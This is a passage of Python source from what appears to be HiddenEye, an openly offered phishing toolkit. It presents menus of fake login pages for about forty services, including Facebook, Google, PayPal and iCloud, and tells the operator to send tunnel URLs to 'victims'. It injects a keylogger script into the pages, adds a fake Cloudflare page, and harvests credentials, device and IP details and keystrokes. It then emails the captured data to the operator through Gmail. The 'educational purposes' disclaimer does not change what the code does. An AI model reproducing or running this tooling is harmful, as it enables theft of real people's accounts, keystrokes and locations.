        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALTUNNEL URL: {2}{4}".format(
            MAIN0, MAIN2, MAIN3, port, str(check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)).strip("b ' \ n r")))
    except CalledProcessError:
        system('clear')
        print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
        print('{0}error[invalid/preoccupied]{0}'.format(MAIN0))
        runLT(port, npm)


def runMainMenu():  # menu where user select what they wanna use
    # Terms Of Service
    print("            _________________________________________________\n           |   WITH GREAT POWER , COMES GREAT RESPONSIBILITY |     \n            +++++++++++++++++++++++++++++++++++++++++++++++++")
    if input("\n\n\n\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational/testing purposes only? ({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y':
        system('clear')
        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(MAIN0, MAIN4))
        exit()


def mainMenu():
    system('clear')
    with open('version.txt') as f:
        ver_current = f.read()
        version = ver_current.strip()
    print('''

 {2} ██   ██ ██ ██████   ██████   ███████ ███   ██  {3}███████ ██    ██ ███████ {1}
 {2} ██   ██ ██ ██    ██ ██    ██ ██      ████  ██  {3}██       ██  ██  ██      {1}
 {2} ███████ ██ ██    ██ ██    ██ ███████ ██ ██ ██  {3}███████   ████   ███████ {1}
 {2} ██   ██ ██ ██    ██ ██    ██ ██      ██  ████  {3}██         ██    ██      {1}
 {2} ██   ██ ██ ██████   ██████   ███████ ██   ███  {3}███████    ██    ███████ {1}
                                                      {3}[{1}v {4}{3}]{1} BY:DARKSEC{2}
             {3}[{2} Modern Phishing Tool With Advanced Functionality {3}]
{3}[{2} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {3}]
________________________________________________________________________________'''.format(MAIN3, MAIN4, MAIN2, MAIN0, version))
    print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------".format(MAIN0, MAIN2))
    print("\n{0}PHISHING-MODULES:".format(MAIN0, MAIN2))
    print(" {0}[{1}01{0}]{1} Facebook       {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(MAIN0, MAIN2))
    print(" {0}[{1}02{0}]{1} Google         {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
        MAIN0, MAIN2))
    print(" {0}[{1}03{0}]{1} LinkedIn       {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt       {0}[{1}39{0}]{1} CUSTOM(1)".format(
        MAIN0, MAIN2))
    print(" {0}[{1}04{0}]{1} GitHub         {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox         {0}[{1}40{0}]{1} CUSTOM(2)".format(
        MAIN0, MAIN2))
    print(" {0}[{1}05{0}]{1} StackOverflow  {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}06{0}]{1} WordPress      {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}07{0}]{1} Twitter        {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}08{0}]{1} Instagram      {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify".format(
        MAIN0, MAIN2))
    print(" {0}[{1}09{0}]{1} Snapchat       {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}10{0}]{1} Yahoo          {0}[{1}22{0}]{1} Quora          {0}[{1}34{0}]{1} Yandex ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}11{0}]{1} Twitch         {0}[{1}23{0}]{1} PornHub        {0}[{1}35{0}]{1} Reddit ".format(
        MAIN0, MAIN2))
    print(" {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ".format(
        MAIN0, MAIN2))
    print("\n{0}SOCIAL-ENGINEERING-TOOLS:".format(MAIN0, MAIN2))
    print(" {0}[{1}A{0}]{1} Get Victim Location".format(MAIN0, MAIN2))

    option = input("\n{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
    if option == '1' or option == '01':
        loadModule('Facebook')
        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
        runPhishing('Facebook', customOption)
    elif option == '2' or option == '02':
        loadModule('Google')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
        runPhishing('Google', customOption)
    elif option == '3' or option == '03':
        loadModule('LinkedIn')
        customOption = ''
        runPhishing('LinkedIn', customOption)
    elif option == '4' or option == '04':
        loadModule('GitHub')
        customOption = ''
        runPhishing('GitHub', customOption)
    elif option == '5' or option == '05':
        loadModule('StackOverflow')
        customOption = ''
        runPhishing('StackOverflow', customOption)
    elif option == '6' or option == '06':
        loadModule('WordPress')
        customOption = ''
        runPhishing('WordPress', customOption)
    elif option == '7' or option == '07':
        loadModule('Twitter')
        customOption = ''
        runPhishing('Twitter', customOption)
    elif option == '8' or option == '08':
        loadModule('Instagram')
        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
        runPhishing('Instagram', customOption)
    elif option == '9' or option == '09':
        loadModule('Snapchat')
        customOption = ''
        runPhishing('Snapchat', customOption)
    elif option == '10':
        loadModule('Yahoo')
        customOption = ''
        runPhishing('Yahoo', customOption)
    elif option == '11':
        loadModule('Twitch')
        customOption = ''
        runPhishing('Twitch', customOption)
    elif option == '12':
        loadModule('Microsoft')
        customOption = ''
        runPhishing('Microsoft', customOption)
    elif option == '13':
        loadModule('Steam')
        customOption = ''
        runPhishing('Steam', customOption)
    elif option == '14':
        loadModule('VK')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
        runPhishing('VK', customOption)
    elif option == '15':
        loadModule('iCloud')
        customOption = ''
        runPhishing('iCloud', customOption)
    elif option == '16':
        loadModule('GitLab')
        customOption = ''
        runPhishing('GitLab', customOption)
    elif option == '17':
        loadModule('NetFlix')
        customOption = ''
        runPhishing('NetFlix', customOption)
    elif option == '18':
        loadModule('Origin')
        customOption = ''
        runPhishing('Origin', customOption)
    elif option == '19':
        loadModule('Pinterest')
        customOption = ''
        runPhishing('Pinterest', customOption)
    elif option == '20':
        loadModule('ProtonMail')
        customOption = ''
        runPhishing('ProtonMail', customOption)
    elif option == '21':
        loadModule('Spotify')
        customOption = ''
        runPhishing('Spotify', customOption)
    elif option == '22':
        loadModule('Quora')
        customOption = ''
        runPhishing('Quora', customOption)
    elif option == '23':
        loadModule('PornHub')
        customOption = ''
        runPhishing('PornHub', customOption)
    elif option == '24':
        loadModule('Adobe')
        customOption = ''
        runPhishing('Adobe', customOption)
    elif option == '25':
        loadModule('Badoo')
        customOption = ''
        runPhishing('Badoo', customOption)
    elif option == '26':
        loadModule('CryptoCurrency')
        customOption = ''
        runPhishing('CryptoCurrency', customOption)
    elif option == '27':
        loadModule('DevianArt')
        customOption = ''
        runPhishing('DevianArt', customOption)
    elif option == '28':
        loadModule('DropBox')
        customOption = ''
        runPhishing('DropBox', customOption)
    elif option == '29':
        loadModule('eBay')
        customOption = ''
        runPhishing('eBay', customOption)
    elif option == '30':
        loadModule('MySpace')
        customOption = ''
        runPhishing('Myspace', customOption)
    elif option == '31':
        loadModule('PayPal')
        customOption = ''
        runPhishing('PayPal', customOption)
    elif option == '32':
        loadModule('Shopify')
        customOption = ''
        runPhishing('Shopify', customOption)
    elif option == '33':
        loadModule('Verizon')
        customOption = ''
        runPhishing('Verizon', customOption)
    elif option == '34':
        loadModule('Yandex')
        customOption = ''
        runPhishing('Yandex', customOption)
    elif option == '35':
        loadModule('Reddit')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
        runPhishing('Reddit', customOption)
    elif option == '36':
        loadModule('Subitoit')
        customOption = ''
        runPhishing('Subitoit', customOption)
    elif option == '37':
        loadModule('PlayStation')
        customOption = ''
        runPhishing('PlayStation', customOption)
    elif option == '38':
        loadModule('Xbox')
        customOption = ''
        runPhishing('Xbox', customOption)
    elif option == '39':
        loadModule('CUSTOM(1)')
        customOption = ''
        runPhishing('CUSTOM(1)', customOption)
    elif option == '40':
        loadModule('CUSTOM(2)')
        customOption = ''
        runPhishing('CUSTOM(2)', customOption)
    
    #Below Are Tools And Above Are Phishing Modules..

    elif option == 'A' or option == 'a':
        loadModule('LOCATION')
        customOption = input(
            "\nOperation mode:\n {0}[{1}1{0}]{1} NEAR YOU (Webpage Looks Like Legitimate)\n {0}[{1}2{0}]{1} GDRIVE (Asks For Location Permission To redirect GDRIVE) \n\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
        runPhishing('LOCATION', customOption)

    else:
        endMessage(port)


def loadModule(module):  # This one just show text..
    print('''\n {0}
 [{1}*{0}] SELECT ANY ONE MODE...{0}\n--------------------------------'''.format(MAIN0, MAIN2))


def inputCustom():  # Question where user can input custom web-link
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    print(
        '''\n{1}**{0}(Do not leave it blank. Unless Errors may occur)'''.format(MAIN2, MAIN4))
    print(
        '''\n{0}[{1}*{0}]{0}Insert a custom redirect url:'''.format(MAIN0, MAIN4))
    custom = input('''\n{0}REDIRECT HERE>>> {2}'''.format(MAIN0, MAIN4, MAIN2))
    if 'http://' in custom or 'https://' in custom:
        pass
    else:
        custom = 'http://' + custom

    if path.exists('Server/www/js/location.js'): # For Location (gdrive) Template Redirection. 
        with open('Server/www/js/location.js') as f: 
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/js/location.js', 'w')
        f.write(c)
        f.close()

    if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
        with open('Server/www/login.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/login.php', 'w')
        f.write(c)
        f.close()

        with open('Server/www/post.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/post.php', 'w')
        f.write(c)
        f.close()

    else:
        with open('Server/www/login.php') as f:
            read_data = f.read()
        c = read_data.replace('<CUSTOM>', custom)
        f = open('Server/www/login.php', 'w')
        f.write(c)
        f.close()


def emailPrompt():
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ PROMPT: NEED CAPTURED DATA TO EMAIL ? ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
    addingEmail()


def addingEmail():
    print("\n{0}[{1}!{0}]{1}No Need To Configure, If you have Already Done. ".format(
        MAIN0, MAIN4))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT CAPTURED DATA TO BE EMAILED, THEN CREATE CONFIG FILE -{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        print("\n{0}[{1}!{0}] BEFORE STARTING MAKE SURE THESE THINGS: \n\n{0}[{1}+{0}] {1}YOU HAVE CORRECT GMAIL USERNAME & PASSWORD\n{0}[{1}+{0}] {1}YOU HAVE DISABLED 2-FACTOR AUTHENTICATION FROM YOUR GMAIL ACCOUNT\n{0}[{1}+{0}] {1}YOU HAVE TURNED ON LESS SECURED APPS \n    (https://myaccount.google.com/lesssecureapps) \n\n".format(MAIN0, MAIN4))
        input('[.] Press Enter To Start Configuring Gmail Credential File...')
        emailPrompt2()
    elif choice == 'N':
        pass
    else:
        print('[^] ERROR: Please choose correct option to continue...')
        sleep(1)
        emailPrompt()


def emailPrompt2():
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ PROMPT: CONFIG EMAIL CREDENTIAL FILE ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
    emailConfig()


def emailConfig():
    system('cp Defs/Send_Email/EmailConfigDefault.py Defs/Send_Email/emailconfig.py')
    GMAILACCOUNT = input(
        "{0}[{1}+{0}]{0} Enter Your Gmail Username:{1} ".format(MAIN0, MAIN4))
    with open('Defs/Send_Email/emailconfig.py') as f:
        read_data = f.read()
        c = read_data.replace('GMAILACCOUNT', GMAILACCOUNT)
        f = open('Defs/Send_Email/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Email Address Added To config File. !\n".format(
            MAIN0, MAIN4))

    GMAILPASSWORD = getpass.getpass(
        "{0}[{1}+{0}]{0} Enter Your Gmail Password:{1} ".format(MAIN0, MAIN4))
    with open('Defs/Send_Email/emailconfig.py') as f:
        read_data = f.read()
        GMAILPASSWORD = base64.b64encode(GMAILPASSWORD.encode())
        GMAILPASSWORD = (GMAILPASSWORD.decode('utf-8'))
        c = read_data.replace('GMAILPASSWORD', GMAILPASSWORD)
        f = open('Defs/Send_Email/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Password(Encoded) Added To config File. !\n".format(
            MAIN0, MAIN4))
    RECIPIENTEMAIL = input(
        "{0}[{1}+{0}]{0} Enter Recipient Email:{1} ".format(MAIN0, MAIN4))
    with open('Defs/Send_Email/emailconfig.py') as f:
        read_data = f.read()
        c = read_data.replace('RECIPIENTEMAIL', RECIPIENTEMAIL)
        f = open('Defs/Send_Email/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Recipient Email Address Added To config File. !\n".format(
            MAIN0, MAIN4))
        print(
            '\n\n{0}[{1}SUCCESS{0}]{0}: Created Config File & Saved To (Defs/Send_Email/Config.py)'.format(MAIN0, MAIN4))


def cloudfarePrompt():

    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
    addingCloudfare()


def addingCloudfare():
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        addCloudfare()
    else:
        sleep(1)


def addCloudfare():
    system('mv Server/www/index.* Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
    print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(MAIN0, MAIN4))
    sleep(1)


def keyloggerprompt():
    system('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**
'''.format(MAIN0, MAIN2))
    print(
        "-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))


def addingkeylogger():
    print("\n{0}[{1}!{0}]{1}ATTENTION: Adding Keylogger Mostly Kills the Tunnel Connection.\n".format(
        MAIN0, MAIN4))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)".format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
        MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y':
        addkeylogger()
    else:
        sleep(1)


def addkeylogger():
    if path.exists('Server/www/index.html'):
        with open('Server/www/index.html') as f:
            read_data = f.read()
        c = read_data.replace(
            '</title>', '</title><script src="keylogger.js"></script>')
        f = open('Server/www/index.html', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(MAIN0, MAIN4))
        sleep(2)
    else:
        with open('Server/www/index.php') as f:
            read_data = f.read()
        c = read_data.replace(
            '</title>', '</title><script src="keylogger.js"></script>')
        f = open('Server/www/index.php', 'w')
        f.write(c)
        f.close()
        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(MAIN0, MAIN4))
        sleep(2)


def runServer(port):
    system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))


def emailPrompt3(port):  # Ask user to start sending credentials to recipient Email Address.
    choice = input(
        "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'Y' or choice == 'y':
        if path.isfile('Defs/Send_Email/emailconfig.py') == True:
            system('python3 Defs/Send_Email/SendEmail.py')
        else:
            print(
                '[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION.')
            sleep(2)
            endMessage(port)
    elif choice == 'N' or choice == 'n':
        endMessage(port)
    else:
        system('clear')
        print("\n\n{0}[{1}^{0}] {2}Please Select A Valid Option.. ".format(
            MAIN0, MAIN4, MAIN2))
        sleep(1)
        system('clear')
        return emailPrompt3(port)

def endMessage(port):  # Message when HiddenEye exit
    choice = input(
        "\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M) : SelectServer(S)\n\n >> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
    if choice == 'R' or choice == 'r':
        system('sudo python3 HiddenEye.py')
    elif choice == 'M' or choice == 'm':
        emailPrompt3(port)
    elif choice == 'S' or choice == 's':
    	returnServer(port)
    elif choice == 'X' or choice == 'x':
        system('clear')
        print('''
                  {3}HIDDEN EYE {3}BY: DARKSEC TEAM
            {1}https://github.com/DarkSecDevelopers/HiddenEye

  {3}  [[*]] IF YOU LIKE THIS TOOL, THEN PLEASE HELP TO BECOME BETTER.
  {0}
     [{3}!{0}] PLEASE LET US KNOW , IF ANY PHISHING PAGE GOT BROKEN .
     [{3}!{0}] MAKE PULL REQUEST, LET US KNOW YOU SUPPORT US.
     [{3}!{0}] IF YOU HAVE MORE PHISHING PAGES, THEN JUST MAKE A PULL REQUEST.
     [{3}!{0}] PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
     [{3}!{0}] WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL

  {3}  [[*]] THANKS FOR USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n '''.format(MAIN2, MAIN2, MAIN4, MAIN0))
    else:
        system('clear')
        return endMessage(port)

def returnServer(port):
	selectServer(port)

def getCredentials(port):

    print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{2}________________________________________________________________________________\n".format(MAIN0, MAIN2, MAIN4))
    while True:
        with open('Server/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                writeLog('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(
                    MAIN2, MAIN3, lines))
                system("touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt && echo -n '' > Server/www/usernames.txt")


        with open('Server/www/ip.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                writeLog('\n {0}[{1} DEVICE DETAILS FOUND {0}]{1}:\n {0}{2}{1}'.format(
                    MAIN2, MAIN3, lines))
                system('touch Server/CapturedData/ip.txt && cat Server/www/ip.txt >> Server/CapturedData/ip.txt && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')

        creds.close()

        with open('Server/www/KeyloggerData.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                writeLog(
                    '{0}...............................'.format(MAIN0, MAIN4))
                writeLog(
                    ' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}'.format(MAIN3, MAIN2, lines))
                system('touch Server/CapturedData/KeyloggerData.txt && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                writeLog(
                    '{0}...............................'.format(MAIN0, MAIN4))

        creds.close()


def writeLog(ctx):  # Writing log
    if config.get("Settings", "DidBackground") == "True":  # if didBackground == True, write
        logFile.write(ctx.replace(MAIN0, "").replace(MAIN1, "").replace(
            MAIN2, "").replace(MAIN3, "").replace(MAIN4, "") + "\n")
    print(ctx)
